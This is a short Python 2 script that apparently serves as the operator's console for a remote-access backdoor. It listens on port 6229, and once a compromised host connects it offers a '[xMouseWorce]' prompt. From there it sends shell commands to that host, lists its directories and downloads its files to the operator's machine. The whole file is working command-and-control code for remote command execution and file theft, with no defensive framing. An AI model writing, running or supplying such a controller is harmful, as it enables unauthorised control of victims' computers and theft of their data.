#!/usr/bin/python
# import python modules
from socket import *
HOST = ''                 # '' means bind to all interfaces
PORT = 6229              #  port 
# create our socket handler
s = socket(AF_INET, SOCK_STREAM)
# set is so that when we cancel out we can reuse port
s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
# bind to interface
s.bind((HOST, PORT))
# print we are accepting connections
print "Listening on 0.0.0.0:%s" % str(PORT)
# listen for only 10 connection
s.listen(10)
# accept connections
conn, addr = s.accept()
# print connected by ipaddress
print 'Connected by', addr
# receive initial connection
data = conn.recv(1024)
print repr(data)
# start loop
while True:     
     # enter shell command
     command = raw_input("[xMouseWorce]: ")
     # send shell command
     conn.send(command)
     # if we specify quit then break out of loop and close socket
     if command == "quit": break
     if command.startswith("cdx2"):
          path = command[5:]
          print "path has been change to ",path
          
     if command == "dirt":
          c=0
          while True:
               l = conn.recv(1024)
               if c==1:
                    break
               while(l):
                    print l
                    if l.endswith("EOFEOFEOFEOFEOFX"):         
                         c=1
                         break
                    else:
                         l= conn.recv(1024)
                         c=1
                         break
               
     if command.startswith("download") == True:
          downFile = command[9:]
          f = open(downFile,'wb')
          print 'downloading ' , downFile
          c=0
          while True:
               l = conn.recv(1024)
               if c==1:
                    break
               while (l):
                    if l.endswith("EOFEOFEOFEOFEOFX"):
                         u = l[:-16]
                         f.write(u)
                         c=1
                         break
                    else:
                         f.write(l)
                         l= conn.recv(1024)
                         c=1
                         break
          f.close()             
conn.close()
